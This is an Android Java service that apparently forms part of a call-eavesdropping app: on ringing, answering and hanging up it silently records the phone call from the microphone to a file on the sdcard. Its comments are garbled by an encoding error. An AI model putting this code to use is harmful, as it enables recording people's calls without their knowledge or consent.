package com.xiaozhe.dialqieting;

import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneListenService extends Service {

	MediaRecorder recorder =null;
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		
		TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		//���ü�����
		tm.listen(new MyPhoneStateListener(),PhoneStateListener.LISTEN_CALL_STATE);
		
	}
	
	class MyPhoneStateListener extends PhoneStateListener{

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			super.onCallStateChanged(state, incomingNumber);
			//���ݲ�ͬ��״̬
			switch(state){
			case TelephonyManager.CALL_STATE_IDLE:
				System.out.println("�绰����");
				if(recorder!=null){
					//ͨ��������ֹͣ¼��
					recorder.stop();
					recorder.release();
				}
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:
				System.out.println("�绰����");
				//��ʼ¼��
				if(recorder!=null){
					recorder.start();
				}
				break;
			case TelephonyManager.CALL_STATE_RINGING:
				System.out.println("�绰����");
				recorder = new MediaRecorder();
				//������Դ
				recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
				//��Ƶ��ʽ
				recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				recorder.setOutputFile("sdcard/luying20151226.3gp");
				//��Ƶ����
				recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				//׼��
				try {
					recorder.prepare();
				} catch (IllegalStateException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				break;
				
			}
		}
		
	}

}
